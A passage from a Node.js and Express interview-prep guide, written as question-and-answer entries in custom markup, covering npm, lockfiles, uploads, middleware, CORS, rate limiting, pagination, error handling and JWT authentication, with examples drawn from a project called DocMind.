+<x-say>dependencies are needed at runtime (express, pg, zod). devDependencies are only for development and builds (typescript, eslint, test runners). <code>npm ci --omit=dev</code> installs only dependencies for production.</x-say>
+<x-simple>Both are installed by <code>npm install</code> in development. In production installs (<code>npm ci --omit=dev</code>) only dependencies are installed, which keeps images smaller and reduces attack surface. When you publish a library, consumers install your dependencies but never your devDependencies. Putting a runtime package in devDependencies breaks production; putting build tools in dependencies just bloats it.</x-simple>
+<x-eg>TypeScript and tsx are devDependencies if you compile before deploying; they’d be dependencies if production runs TypeScript directly.</x-eg>
+
+<x-fu q="What are peerDependencies?">Packages your library expects the host app to provide (e.g. a React component library expects react), so there aren’t two copies.</x-fu>
+<x-no>“devDependencies aren’t installed locally.”</x-no>
+<x-ev>Build awareness.</x-ev></x-q>
+
+<x-q n="3.12" tag="must basic"><x-t>What is npm?</x-t>
+<x-say>Node’s package manager and registry: it installs packages into node_modules, resolves version ranges, runs scripts and publishes packages.</x-say>
+<x-simple>npm has three parts: the public registry of packages, the CLI that installs, updates, runs scripts and publishes, and the package format (package.json + tarball). It resolves the dependency tree from version ranges, downloads tarballs, verifies integrity hashes, writes node_modules and the lockfile, and runs lifecycle scripts (install scripts can execute code, a supply-chain risk). Alternatives: pnpm, yarn, bun.</x-simple>
+<x-eg><code>npm ci</code> in CI installs exactly what package-lock.json says and fails if it doesn’t match package.json.</x-eg>
+
+<x-fu q="npm install vs npm ci?">install may update the lockfile within ranges; ci deletes node_modules and installs exactly the lockfile, failing on mismatch: reproducible and faster in CI.</x-fu>
+<x-no>“npm is only a registry.”</x-no>
+<x-ev>Basics.</x-ev></x-q>
+
+<x-q n="3.13" tag="must basic"><x-t>What is the purpose of package-lock.json?</x-t>
+<x-say>It records the exact resolved version and integrity hash of every installed package, including transitive ones, so every machine and CI run installs the identical tree. Commit it; use <code>npm ci</code> in CI.</x-say>
+<x-simple>package.json says “express ^5.1.0”; without a lockfile two installs a month apart could get different versions of Express and of hundreds of transitive packages. The lockfile records the exact resolved version, download URL and integrity hash for every package in the tree, so builds are reproducible and tampered tarballs are rejected. Commit it; review big lockfile changes.</x-simple>
+<x-eg>A teammate’s laptop works, CI fails: often a transitive dependency resolved to a new version on one side. The lockfile prevents that.</x-eg>
+<x-fu q="What’s a supply-chain risk here?">A compromised package version. Lockfiles plus integrity hashes, reviewing new dependencies, and <code>npm audit</code> reduce it.</x-fu>
+
+<x-no>“You should gitignore package-lock.json.”</x-no>
+<x-ev>Reproducible builds.</x-ev></x-q>
+
+<x-q n="3.14" tag="must solid"><x-t>How would you handle file uploads in Node.js?</x-t>
+<x-say>Use multipart/form-data with a parser like multer or busboy, enforce size and type limits early, store the file in object storage (not the DB), save metadata in a table, and process it in a background job.</x-say>
+<x-code><pre data-l="js">import multer from 'multer';
+const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 10 * 1024 * 1024 } });
+app.post('/upload', requireAuth, checkQuota, upload.single('file'), async (req, res) => {
+  if (req.file?.mimetype !== 'application/pdf') throw new HttpError(400, 'PDF only');
+  // also check magic bytes: %PDF-
+  if (!req.file.buffer.subarray(0, 5).equals(Buffer.from('%PDF-'))) throw new HttpError(400, 'Not a PDF');
+  const doc = await ingestion.queue(req.user.id, req.file);   // → 202
+  res.status(202).json(doc);
+});</pre></x-code>
+<x-dm>DocMind runs <code>checkDocumentCap</code> before multer, so an over-limit user is rejected before the file is even read; 10 MB cap; 413 for oversize via the last-resort error handler.</x-dm>
+
+<x-fu q="How do you stop users uploading malware or huge files?">Size limits enforced while streaming (not after buffering), type checks by magic bytes, per-user quotas and rate limits, storing files privately with random keys, scanning in a background job if files are shared, and never serving uploads from your own origin as HTML.</x-fu>
+<x-no>Trusting the Content-Type header or file extension.</x-no>
+<x-ev>Practical backend skill.</x-ev></x-q>
+
+<x-q n="3.15" tag="must solid"><x-t>How would you process a large file without loading the entire file into memory?</x-t>
+<x-say>Stream it: read with a readable stream and process chunk by chunk (or line by line with readline), using <code>pipeline</code> for backpressure and error handling. For uploads, stream directly to storage, then have a worker stream it back for processing.</x-say>
+<x-simple><p>For PDFs specifically, many parsers need random access to the whole file, so you process page by page if the library supports it, and do it in a worker process with a memory limit.</p></x-simple>
+<x-eg>Import a 3 GB CSV of products: <code>createReadStream</code> → a CSV parser transform → batch rows into groups of 1,000 → insert each batch in a transaction; memory stays flat and progress can be recorded per batch for resume.</x-eg>
+
+<x-fu q="How do you make that import resumable?">Record the last committed batch (row offset or last primary key) in a jobs table; on restart, skip to it. Use upserts so a re-run batch doesn’t duplicate.</x-fu>
+<x-no>“Just increase Node’s memory limit.”</x-no>
+<x-ev>Memory reasoning.</x-ev></x-q>
+
+<h2 class="sec"><span class="k">3.2</span>Express.js</h2>
+
+<x-q n="3.16" tag="must basic"><x-t>What is Express.js?</x-t>
+<x-say>A minimal web framework for Node that adds routing, a middleware pipeline and helpers on top of the http module.</x-say>
+<x-simple>Express wraps Node’s http server. It adds: a router that matches method + path (with params like <code>/docs/:id</code>), a middleware chain, request/response helpers (<code>req.params</code>, <code>req.query</code>, <code>res.json</code>, <code>res.status</code>), error-handling middleware, and sub-routers for structuring apps. It’s deliberately unopinionated: you choose validation, ORM and structure. Express 5 adds native promise support (rejected async handlers go to the error handler) and stricter path syntax.</x-simple>
+<x-eg><code>const app = express(); app.use(express.json()); app.get('/health', (req, res) => res.json({ ok: true })); app.listen(3000);</code></x-eg>
+
+<x-fu q="Name an alternative and why you might choose it.">Fastify: faster routing and built-in schema validation/serialisation; NestJS: an opinionated framework with dependency injection for large teams.</x-fu>
+<x-no>“Express is a server.” It runs on Node’s http server.</x-no>
+<x-ev>Basics.</x-ev></x-q>
+
+<x-q n="3.17" tag="must basic"><x-t>How does an Express request-response lifecycle work?</x-t>
+<x-say>Node parses the HTTP request into req; Express runs matching middleware and routes in registration order; each calls next() or ends the response; errors skip to error-handling middleware; the response is sent once.</x-say>
+<x-simple><p>Step through the “Express request” animation in lesson 3.B.</p></x-simple>
+<x-eg>A 401 case: request → cors → json → requireAuth finds no token → <code>next(new HttpError(401))</code> → skips routes → error handler sends <code>{ error: 'Sign in required' }</code>.</x-eg>
+
+<x-fu q="What happens if no route matches?">Express falls through to your 404 middleware (registered after all routes); without one, Express sends its default “Cannot GET /x”.</x-fu>
+<x-no>“Express runs all middleware in parallel.”</x-no>
+<x-ev>Mental model.</x-ev></x-q>
+
+<x-q n="3.18" tag="must basic"><x-t>What is middleware?</x-t>
+<x-say>A function <code>(req, res, next)</code> that runs during the request pipeline and can read or modify req/res, end the response, or pass control on with next().</x-say>
+<x-simple>Middleware is Express’s plug-in mechanism. Each function receives the same req and res objects, so earlier middleware can attach data for later ones (<code>req.user</code>, <code>req.body</code>, a request id). They can be mounted globally (<code>app.use(fn)</code>), on a path prefix (<code>app.use('/api', fn)</code>), on a router, or per route (<code>app.get('/x', auth, handler)</code>). A route handler is just the last middleware in its chain.</x-simple>
+<x-eg>Logging, CORS, body parsing, auth, validation, rate limiting, compression.</x-eg>
+<x-code><pre data-l="js">// request id + timing middleware
+import crypto from 'node:crypto';
+app.use((req, res, next) =&gt; {
+  req.id = req.get('x-request-id') ?? crypto.randomUUID();
+  const start = performance.now();
+  res.setHeader('x-request-id', req.id);
+  res.on('finish', () =&gt; console.info(JSON.stringify({ id: req.id, method: req.method, path: req.path, status: res.statusCode, ms: Math.round(performance.now() - start) })));
+  next();
+});</pre></x-code>
+
+<x-fu q="How do you pass data from middleware to a handler?">Attach it to <code>req</code> (e.g. req.user) or <code>res.locals</code>.</x-fu>
+<x-ev>Core Express concept.</x-ev></x-q>
+
+<x-q n="3.19" tag="must basic"><x-t>What happens when you call next()?</x-t>
+<x-say>Express runs the next matching middleware or route. <code>next(err)</code> skips to the next error handler. <code>next('route')</code> skips the remaining handlers of the current route. If you neither call next nor respond, the request hangs.</x-say>
+<x-simple>Express keeps an index into the stack of matching layers. <code>next()</code> moves to the next layer whose path and method match. <code>next(err)</code> switches to error mode: Express skips normal middleware and calls only 4-argument error handlers. <code>next('route')</code> skips remaining handlers of the current route (only in route-level stacks); <code>next('router')</code> exits the current router. Calling next after a response was sent leads to “headers already sent” errors if a later handler responds again.</x-simple>
+<x-eg><code>if (!req.user) return next(new HttpError(401)); next();</code>: note the <code>return</code>, otherwise both branches run.</x-eg>
+
+<x-fu q="What if a middleware forgets to call next and doesn’t respond?">The request hangs until the client or proxy times out; a common bug in custom auth middleware.</x-fu>
+<x-no>“next() returns the response.”</x-no>
+<x-ev>Precision.</x-ev></x-q>
+
+<x-q n="3.20" tag="must basic"><x-t>What is the difference between application-level and router-level middleware?</x-t>
+<x-say>Application-level is registered with <code>app.use()</code> and applies to everything after it. Router-level is registered on an <code>express.Router()</code> and only applies to that router’s routes, so you can group concerns (e.g. admin routes with an admin check).</x-say>
+<x-simple>Application-level middleware attaches to the app object and runs for every request matching its path (or all requests). Router-level middleware attaches to an express.Router instance, which is itself mounted on the app under a prefix, so it only runs for routes in that router. This lets you scope concerns: auth for <code>/api</code>, admin checks for <code>/admin</code>, a different body-size limit for <code>/upload</code>.</x-simple>
+<x-code><pre data-l="js">const admin = express.Router();
+admin.use(requireRole('admin'));
+admin.get('/stats', getStats);
+app.use('/admin', requireAuth, admin);</pre></x-code>
+
+<x-fu q="Where would you put a webhook route that needs the raw body?">Mount it before the global <code>express.json()</code>, with <code>express.raw({ type: 'application/json' })</code> on that route only, because signature verification needs the exact bytes.</x-fu>
+<x-no>“Router middleware runs before app middleware.” Order is registration order along the path.</x-no>
+<x-ev>Code organisation.</x-ev></x-q>
+
+<x-q n="3.21" tag="must basic"><x-t>What is error-handling middleware?</x-t>
+<x-say>Middleware with four parameters <code>(err, req, res, next)</code>. Express calls it when something calls next(err) or (Express 5) an async handler rejects. It should be registered last, log the error and send a safe response.</x-say>
+<x-simple>Express recognises an error handler by its arity (4 parameters), so you must declare all four even if you don’t use next. It runs when next(err) is called or a handler throws synchronously (or returns a rejected promise in Express 5). Several error handlers can be chained (log, then format). If headers were already sent (e.g. mid-stream), delegate to Express’s default with <code>next(err)</code>, which closes the connection.</x-simple>
+<x-code><pre data-l="js">app.use((err, req, res, next) =&gt; {
+  if (res.headersSent) return next(err);                 // can't send JSON mid-stream
+  const status = Number.isInteger(err.status) ? err.status : 500;
+  if (status &gt;= 500) logger.error({ err, reqId: req.id }, 'unhandled');
+  res.status(status).json({ error: status &gt;= 500 ? 'Internal server error' : err.message, requestId: req.id });
+});</pre></x-code>
+
+<x-fu q="Why include a request id in the error response?">Users and support can quote it, and you can find the exact log lines.</x-fu>
+<x-no>Declaring it with three parameters (Express treats it as normal middleware).</x-no>
+<x-ev>Robustness.</x-ev></x-q>
+
+<x-q n="3.22" tag="must basic"><x-t>Why does Express have a particular middleware execution order?</x-t>
+<x-say>Because middleware is just a list processed top to bottom, and each step may depend on earlier ones: auth needs the parsed headers, validation needs the parsed body, routes need the authenticated user. Order is how you express those dependencies.</x-say>
+<x-eg><code>app.use(requireAuth); app.use(cors());</code>: the browser’s preflight OPTIONS (which never carries the token) is rejected with 401 before CORS headers are set, so every cross-origin call fails with a confusing CORS error.</x-eg>
+<x-dm>DocMind mounts the public auth router, then <code>app.use(requireAuth)</code>, then every data router: a router added later is protected by default (“default deny”). cors() must stay above requireAuth.</x-dm>
+
+<x-fu q="Where should the error handler go?">After all routes and the 404 handler: it only catches errors from middleware registered before it.</x-fu>
+<x-no>“Order doesn’t matter in Express.”</x-no>
+<x-ev>Design reasoning.</x-ev></x-q>
+
+<x-q n="3.23" tag="must solid"><x-t>How would you create a custom authentication middleware?</x-t>
+<x-say>Read the Authorization header, require the Bearer scheme, verify the JWT with the secret and a pinned algorithm, attach the user id to req.user, call next(); on any failure respond 401 without calling next.</x-say>
+<x-simple>Steps: extract the credential (Authorization header, or cookie), verify it (signature, expiry, algorithm, optionally issuer/audience), map it to an identity (<code>req.user = { id: payload.sub, role }</code>), and decide failure behaviour (401 with a generic message; never call next on failure). Optional parts: load the user from the DB to check they still exist or aren’t banned, refresh-token handling, and different rules for optional auth (attach user if present, continue anyway).</x-simple>
+<x-code><pre data-l="js">See requireAuth in the mini app above. Key points: verify (not decode), algorithms pinned,
+a single generic 401 message, and no database lookup unless you need fresh user data.</pre></x-code>
+<x-fu q="How do you revoke a JWT before it expires?">Short expiry + refresh tokens, or a denylist of token ids (jti) checked per request (adds a lookup), or a per-user “tokens valid after” timestamp.</x-fu>
+
+<x-no>Using <code>jwt.decode</code>, or returning detailed reasons (“signature invalid”, “expired at …”) that help attackers.</x-no>
+<x-ev>Hands-on auth.</x-ev></x-q>
+
+<x-q n="3.24" tag="must basic"><x-t>How would you validate incoming request data?</x-t>
+<x-say>With a schema library like Zod at the edge of the API: parse body, params and query; reject with 400 and field-level errors; pass only the parsed, typed data to the service.</x-say>
+<x-simple><p>Validate types and shapes, ranges and lengths, formats (email, uuid), and reject unknown fields where it matters (<code>z.strictObject</code>). Business rules (does the document belong to you? is it ready?) belong in the service.</p></x-simple>
+<x-eg><code>POST /chat</code> body <code>{ message: 42 }</code> → Zod says “message: expected string” → 400 before any embedding or LLM spend.</x-eg>
+
+<x-fu q="Where should validation happen: route, service or database?">All three, at different levels: the route validates shape and types (Zod), the service validates business rules (ownership, state), and the database enforces invariants (NOT NULL, UNIQUE, CHECK, FKs) as the last line.</x-fu>
+<x-no>Validating only in the frontend.</x-no>
+<x-ev>Input hygiene.</x-ev></x-q>
+
+<x-q n="3.25" tag="must basic"><x-t>What is the difference between route parameters, query parameters and request bodies?</x-t>
+<x-say>Route params identify a resource in the path (<code>/documents/:id</code>). Query params filter, sort or paginate (<code>?limit=20&amp;cursor=…</code>). The body carries the data you create or update (JSON on POST/PUT/PATCH).</x-say>
+<x-simple>Use path parameters for identity (which resource): <code>GET /documents/:id</code>. Use query parameters for options on a read: filtering, sorting, pagination, search (<code>?status=ready&amp;limit=20</code>); they appear in logs and browser history, so never put secrets there. Use the body for the representation you create or change, and for large or structured input. GET requests shouldn’t have bodies.</x-simple>
+<x-eg><code>PATCH /documents/42?notify=false</code> with body <code>{ "title": "New title" }</code>: id in the path, an option in the query, the change in the body.</x-eg>
+
+<x-fu q="Why did DocMind move /chat-stream from GET + query to POST + body?">Questions ended up in URLs (logs, history), URL length limits, and a route that saves messages is a POST’s job. GET was only there because EventSource can’t POST.</x-fu>
+<x-no>Putting passwords or tokens in query strings.</x-no>
+<x-ev>REST conventions.</x-ev></x-q>
+
+<x-q n="3.26" tag="must basic"><x-t>What’s the difference between req.params, req.query and req.body?</x-t>
+<x-say><code>req.params</code> holds named path segments, <code>req.query</code> the parsed query string (all strings), <code>req.body</code> the parsed body, which is only present if a body parser like express.json() ran.</x-say>
+<x-simple><code>req.params</code> is filled by the router from named segments (always strings). <code>req.query</code> is parsed from the URL’s query string by Express’s query parser (strings, or arrays/objects for repeated or bracketed keys like <code>?tag=a&amp;tag=b</code>); in Express 5 it’s a getter you can’t reassign. <code>req.body</code> is undefined until a body-parsing middleware runs (<code>express.json()</code>, <code>express.urlencoded()</code>, multer for multipart).</x-simple>
+<x-eg><code>GET /users/7/docs?page=2</code> → <code>req.params.userId === '7'</code>, <code>req.query.page === '2'</code>, <code>req.body === undefined</code>.</x-eg>
+<x-no>Treating query values as numbers without converting them.</x-no>
+<x-ev>Basics.</x-ev></x-q>
+
+<x-q n="3.27" tag="must basic"><x-t>What is CORS?</x-t>
+<x-say>Cross-Origin Resource Sharing: a browser security rule. A page from origin A can only read responses from origin B if B’s response headers allow A (Access-Control-Allow-Origin). The server sets the headers; the browser enforces them.</x-say>
+<x-simple><p>Origin = scheme + host + port. CORS doesn’t protect your API from curl or other servers; it protects users’ browsers from malicious sites reading data with their credentials.</p></x-simple>
+<x-eg>Frontend on https://app.example.com calls API on https://api.example.com: different origins, so the API must answer with <code>Access-Control-Allow-Origin: https://app.example.com</code>.</x-eg>
+<x-code><pre data-l="js">import cors from 'cors';
+const allowed = new Set((process.env.FRONTEND_URL ?? '').split(',').map((s) =&gt; s.trim().replace(/\/$/, '')));
+app.use(cors({
+  origin: (origin, cb) =&gt; cb(null, !origin || allowed.has(origin)),   // no Origin = curl/server-to-server
+  credentials: false,                                                  // true only if you use cookies
+  maxAge: 600,                                                         // cache preflight 10 minutes
+}));</pre></x-code>
+<x-dm>DocMind: frontend on Vercel, API on Render, so FRONTEND_URL lists the allowed origins (comma-separated, trailing slashes stripped).</x-dm>
+
+<x-fu q="Why is &lt;code&gt;Access-Control-Allow-Origin: *&lt;/code&gt; with credentials not allowed?">Browsers forbid wildcard origins when cookies/credentials are included, to stop any site from making authenticated reads.</x-fu>
+<x-no>“CORS protects my API from attackers.” It only restricts what browsers let pages read.</x-no>
+<x-ev>Web security basics.</x-ev></x-q>
+
+<x-q n="3.28" tag="must solid"><x-t>What is preflight handling?</x-t>
+<x-say>Before a “non-simple” cross-origin request (e.g. with an Authorization header, JSON content type, or PUT/DELETE), the browser sends an OPTIONS request asking which methods and headers are allowed. The server must answer it with the right CORS headers, without requiring auth.</x-say>
+<x-simple>A request is “simple” only if it uses GET/HEAD/POST, a few safe headers, and Content-Type form/text. Anything else (JSON body, Authorization header, PUT/DELETE) triggers an automatic OPTIONS preflight with <code>Access-Control-Request-Method</code> and <code>-Headers</code>. The server must reply 2xx with matching <code>Access-Control-Allow-Methods/-Headers/-Origin</code>; only then does the browser send the real request. Auth middleware must let OPTIONS through (it carries no token).</x-simple>
+<x-eg>Every DocMind chat request (JSON + Bearer header) is preceded by a preflight, which is why <code>cors()</code> sits above <code>requireAuth</code>.</x-eg>
+<x-fu q="How do you reduce preflight overhead?">Set <code>Access-Control-Max-Age</code> so the browser caches the preflight result.</x-fu>
+
+<x-no>“Preflight is sent by Express.” The browser sends it.</x-no>
+<x-ev>Practical CORS.</x-ev></x-q>
+
+<x-q n="3.29" tag="must basic"><x-t>What is rate limiting?</x-t>
+<x-say>Limiting how many requests a client (IP, user or API key) can make in a time window, returning 429 when exceeded. It protects against abuse, brute force and runaway costs.</x-say>
+<x-an>A nightclub door: only so many people per hour; everyone else waits outside.</x-an>
+<x-simple><p>Algorithms: fixed window (simple, bursts at edges), sliding window, token bucket (allows short bursts, smooth average). With several server instances, keep counters in a shared store like Redis.</p></x-simple>
+<x-eg>Login endpoint: 5 attempts per 15 minutes per IP + email; chat: 20 messages per minute per user; a daily token budget per user for LLM cost.</x-eg>
+<x-code><pre data-l="js">import rateLimit from 'express-rate-limit';
+import { RedisStore } from 'rate-limit-redis';          // shared counters across instances
+export const chatLimiter = rateLimit({
+  windowMs: 60_000,
+  limit: 20,                                            // express-rate-limit v7+/v8 option name
+  keyGenerator: (req) =&gt; req.user.id,                   // per user (run after requireAuth)
+  standardHeaders: 'draft-8', legacyHeaders: false,     // RateLimit-* headers
+  store: new RedisStore({ sendCommand: (...args) =&gt; redis.call(...args) }),
+});</pre></x-code>
+<x-dm>DocMind: one shared counter per IP for /auth/guest, /register and /login (20 per 15 min), in memory, so it resets on every restart. Behind Render + Cloudflare the right <code>trust proxy</code> value was 3, found by measuring.</x-dm>
+
+<x-fu q="Why does the proxy setting matter for IP-based limits?">Behind proxies req.ip is the proxy’s address unless <code>trust proxy</code> is set to the right number of hops; wrong values either merge all users into one bucket or let clients spoof X-Forwarded-For.</x-fu>
+<x-no>Rate limiting by IP only (many users share an IP; one attacker uses many).</x-no>
+<x-ev>Protection mindset.</x-ev></x-q>
+
+<x-q n="3.30" tag="must solid"><x-t>How would you implement pagination?</x-t>
+<x-say>Offset/limit for small or admin lists; cursor (keyset) pagination for large or live lists: order by a unique, stable key and ask for rows after the last one seen. Always cap the page size.</x-say>
+<x-simple>Offset pagination (<code>LIMIT 20 OFFSET 40</code>) is simple and supports “jump to page 7”, but the database must scan and discard all skipped rows, so deep pages get slow, and inserts between requests shift items (duplicates or gaps). Cursor/keyset pagination returns an opaque cursor encoding the last row’s sort key (e.g. created_at + id) and asks for rows strictly after it, using an index: constant speed and stable under inserts, but no random page jumps. Always cap the limit and return <code>nextCursor</code> (null at the end).</x-simple>
+<x-code><pre data-l="sql">-- offset: simple, but slow at high offsets and rows shift when new ones arrive
+SELECT * FROM documents WHERE user_id = $1 ORDER BY created_at DESC LIMIT 20 OFFSET 40;
+-- keyset: uses the index, stable
+SELECT * FROM documents WHERE user_id = $1 AND (created_at, id) &lt; ($2, $3)
+ORDER BY created_at DESC, id DESC LIMIT 20;</pre></x-code>
+
+<x-fu q="Why include id in the cursor, not only created_at?">Timestamps can tie; a unique tiebreaker gives a strict total order so no row is skipped or repeated.</x-fu>
+<x-no>Returning all rows and paginating in the frontend.</x-no>
+<x-ev>Scalability thinking.</x-ev></x-q>
+
+<x-q n="3.31" tag="must solid"><x-t>How would you implement centralized error handling?</x-t>
+<x-say>Throw typed errors (HttpError with a status) from anywhere, let Express forward them to one error middleware, which logs details with a request id and returns a consistent JSON shape, hiding internals for 5xx.</x-say>
+<x-simple>Central error handling means: code anywhere throws (or rejects) with a meaningful error type; nothing catches just to log and continue; one handler maps error types to HTTP responses (validation → 400, not found → 404, conflict → 409, provider busy → 503, unknown → 500), logs with context (request id, user id, route), and never leaks stack traces or SQL. Wrap third-party errors (DB unique violation 23505 → ConflictError).</x-simple>
+<x-eg>A Drizzle error embeds the SQL and all parameters; DocMind’s <code>summarizeError()</code> logs the first line, the cause chain and the first in-repo stack frame instead of 3,072 embedding numbers.</x-eg>
+<x-dm>DocMind’s <code>summarizeError()</code> exists because Drizzle errors embed the SQL and every bound parameter: for vector search that printed 3072 numbers and buried the real cause (ECONNRESET in the cause chain).</x-dm>
+
+<x-fu q="Should services throw HttpError?">Better to throw domain errors (NotFoundError, ConflictError) and map them to HTTP in the handler, so services stay reusable by workers.</x-fu>
+<x-no>try/catch in every route returning 500.</x-no>
+<x-ev>Maintainability.</x-ev></x-q>
+
+<x-q n="3.32" tag="must solid"><x-t>How would you structure a large Express application?</x-t>
+<x-say>By layer and feature: routes (thin, HTTP only) → services (business rules) → repositories (data access), plus middleware, schemas, config and a composition root (app.js builds the app, index.js starts it so tests can import the app without listening).</x-say>
+<x-code><pre data-l="text">src/
+  app.js            builds express app (no listen)
+  index.js          env check, listen, graceful shutdown
+  config.js
+  middleware/       auth.js, rateLimit.js, errors.js
+  routes/           documents.routes.js, chat.routes.js
+  services/         documents.service.js, chat.service.js, llm.service.js
+  repositories/     documents.repository.js, chunks.repository.js
+  schemas/          zod schemas
+  workers/          background jobs</pre></x-code>
+
+<x-fu q="When would you split into separate services (microservices)?">Rarely for a junior-size team: when parts need independent scaling or deploys (e.g. a GPU worker, an ingestion pipeline), or separate teams own them. Start with a well-structured monolith plus background workers.</x-fu>
+<x-no>One huge app.js with routes, SQL and business logic mixed.</x-no>
+<x-ev>Architecture sense.</x-ev></x-q>
+
+<x-q n="3.33" tag="must basic"><x-t>What is the difference between a controller, service and repository?</x-t>
+<x-say>Controller: translates HTTP into a function call and back (read req, send res). Service: business rules and orchestration, no HTTP. Repository: all database access for an entity, no business rules.</x-say>
+<x-simple>These layers separate reasons to change. The controller changes when the HTTP API changes (paths, status codes, request shapes). The service changes when business rules change (limits, workflows, who may do what). The repository changes when storage changes (SQL, schema, ORM). Each layer depends only downward. Benefits: testable services with fake repositories, reuse from jobs and CLIs, and a single place for data-access rules like “every query filters by user”.</x-simple>
+<x-code><pre data-l="js">// controller
+app.delete('/documents/:id', async (req, res) =&gt; { await documentsService.remove(req.user.id, req.params.id); res.sendStatus(204); });
+// service
+export async function remove(userId, id) {
+  const doc = await documentsRepo.getForUser(userId, id);
+  if (!doc) throw new NotFoundError('document');
+  await documentsRepo.deleteRow(userId, id);           // row first: a running job sees it gone
+  await chunksRepo.deleteByDocument(id);
+}
+// repository
+export const getForUser = (userId, id) =&gt; db.select().from(documents).where(and(eq(documents.id, id), eq(documents.userId, userId))).then((r) =&gt; r[0]);</pre></x-code>
+<x-dm>DocMind’s rule: nothing outside repositories touches SQL, and services never touch req/res. <code>prepareChat()</code> returns <code>{ ok: false, status, error }</code> and the route sends it. That’s what let the BullMQ worker reuse ingestion code.</x-dm>
+
+<x-fu q="Is a repository layer necessary with an ORM?">Not strictly, but it keeps query rules (ownership filters, soft deletes) in one place and makes services easy to test.</x-fu>
+<x-no>“Services should read req.body directly.”</x-no>
+<x-ev>Separation of concerns.</x-ev></x-q>
+
+<x-q n="3.34" tag="must basic"><x-t>Why shouldn’t business logic be placed entirely inside route handlers?</x-t>
+<x-say>It can’t be reused (workers, CLI, other routes), it’s hard to unit test without HTTP, it mixes concerns, and handlers grow into unreadable files.</x-say>
+<x-simple>Route handlers are tied to Express’s req/res. Logic inside them can’t be called from a queue worker, a cron job, a CLI or another route without faking HTTP objects. They also mix concerns (parsing, rules, SQL, formatting), making them hard to read and to unit-test, and rules get duplicated when two routes need them.</x-simple>
+<x-eg>DocMind’s ingestion code moved into a service so the BullMQ worker could reuse <code>embedAndStoreChunks</code> without HTTP.</x-eg>
+
+<x-fu q="How thin should a handler be?">Read validated input and the user, call one service function, map the result to a response.</x-fu>
+<x-no>“It’s fine as long as it works.”</x-no>
+<x-ev>Design judgement.</x-ev></x-q>
+
+<x-q n="3.35" tag="must solid"><x-t>How would you protect an API against malicious input?</x-t>
+<x-say>Validate everything at the boundary (types, lengths, formats, unknown fields), limit body size, use parameterized queries, escape output, enforce auth and ownership server-side, rate limit, and never pass raw input to shell, eval, file paths or LLM tools without checks.</x-say>
+<x-simple><p>Also: helmet for headers, check file magic bytes, cap message length before sending to an LLM (DocMind has no cap yet: ISSUES #9), and treat LLM output as untrusted input too.</p></x-simple>
+<x-eg>A chat endpoint without a length cap accepts a 2 MB message: it is embedded, sent to the LLM (cost) and stored. A <code>z.string().max(4000)</code> and <code>express.json({ limit: '32kb' })</code> stop it before any work.</x-eg>
+
+<x-fu q="What is ReDoS?">A regex with nested quantifiers (e.g. <code>/(a+)+$/</code>) that takes exponential time on crafted input, blocking the event loop. Avoid such patterns on user input or use safe-regex tools.</x-fu>
+<x-no>“Escaping HTML on input is enough.” Escape on output for the context you render into.</x-no>
+<x-ev>Security mindset.</x-ev></x-q>
+
+<h2 class="sec"><span class="k">3.3</span>Authentication and security</h2>
+
+<x-q n="3.36" tag="must basic"><x-t>What is authentication?</x-t>
+<x-say>Verifying who someone is: password, token, OAuth login, API key.</x-say>
+<x-simple>Authentication answers “who is making this request?” with evidence: something you know (password), have (a device, a key) or are (biometrics), or a token issued after one of those. In APIs the evidence per request is usually a session cookie, a JWT, an API key, or an OAuth access token. Multi-factor authentication combines two kinds.</x-simple>
+<x-eg>Logging in with email + password, then sending the JWT on every request.</x-eg>
+<x-fu q="What is OAuth for?">Delegated authorisation: letting an app act on your behalf at another service (e.g. read your Google Drive) without sharing your password. “Login with Google” uses OpenID Connect on top of it.</x-fu>
+<x-no>Confusing it with authorization.</x-no>
+<x-ev>Basics.</x-ev></x-q>
+
+<x-q n="3.37" tag="must basic"><x-t>What is authorization?</x-t>
+<x-say>Deciding what an authenticated identity may do or access: this user may read their own documents but not yours; admins may delete.</x-say>
+<x-simple>Authorization runs after authentication, on every access: does this identity have permission for this action on this resource? Models: ownership checks (user_id on the row), roles (RBAC: admin, member), attributes (ABAC: department, plan), or ACL entries (shared documents). It must be enforced on the server at the data layer; hiding a button in the UI is not authorization.</x-simple>
+<x-eg>Logging in proves you’re Asha (authentication). Being allowed to open document 42 depends on whether it’s Asha’s (authorization).</x-eg>
+
+<x-fu q="Where do authorization bugs usually hide?">In endpoints that take ids from the client (IDOR), in background jobs that forget the owner, and in search/vector queries missing the tenant filter.</x-fu>
+<x-no>“The frontend only shows the user their own items, so it’s safe.”</x-no>
+<x-ev>The distinction is a classic red-flag check.</x-ev></x-q>
+
+<x-q n="3.38" tag="must basic"><x-t>What is JWT?</x-t>
+<x-say>JSON Web Token: a compact, signed token with JSON claims (like the user id and expiry). The server can verify it with a key, without storing sessions.</x-say>
+<x-simple>A JWT is a standard (RFC 7519) format for a JSON payload of claims plus a signature (JWS), base64url-encoded so it fits in headers and URLs. Registered claims include <code>sub</code> (subject/user id), <code>exp</code> (expiry), <code>iat</code> (issued at), <code>iss</code>/<code>aud</code> (issuer/audience). Symmetric algorithms (HS256) use one secret to sign and verify; asymmetric ones (RS256, ES256) sign with a private key and verify with a public key, useful when many services verify tokens from one issuer.</x-simple>
+<x-eg><code>jwt.sign({ role: 'user' }, secret, { subject: user.id, expiresIn: '15m', algorithm: 'HS256' })</code>.</x-eg>
+<x-fu q="Why stateless tokens instead of server sessions?">No session lookup per request and easy horizontal scaling; the trade-off is that revocation before expiry needs extra machinery.</x-fu>
+<x-no>“JWTs are encrypted.”</x-no>
+<x-ev>Basics.</x-ev></x-q>
+
+<x-q n="3.39" tag="must basic"><x-t>Explain the structure of a JWT.</x-t>
+<x-say>Three base64url parts separated by dots: header (algorithm, type), payload (claims like sub, exp, iat), signature (computed over header.payload with the key).</x-say>
+<x-simple><p>Try the JWT inspector in lesson 3.B: edit the payload with the old signature and verification fails.</p></x-simple>
+<x-eg>Decoding the payload of any JWT takes one line: <code>JSON.parse(Buffer.from(token.split('.')[1], 'base64url'))</code>. That’s why the payload should hold only an id and non-sensitive claims.</x-eg>
+
+<x-fu q="What does the header’s alg field risk?">If a server trusts it, an attacker can choose “none” or switch RS256 to HS256 using the public key as the secret. Pin allowed algorithms when verifying.</x-fu>
+<x-no>“The payload is encrypted.” It’s only encoded. Never put secrets in it.</x-no>
+<x-ev>Precision.</x-ev></x-q>
+
+<x-q n="3.40" tag="must basic"><x-t>How does JWT authentication work?</x-t>
+<x-say>Login checks credentials and returns a signed token. The client sends it in the Authorization header on each request. Middleware verifies the signature and expiry and attaches the user id; routes then authorize using that id.</x-say>
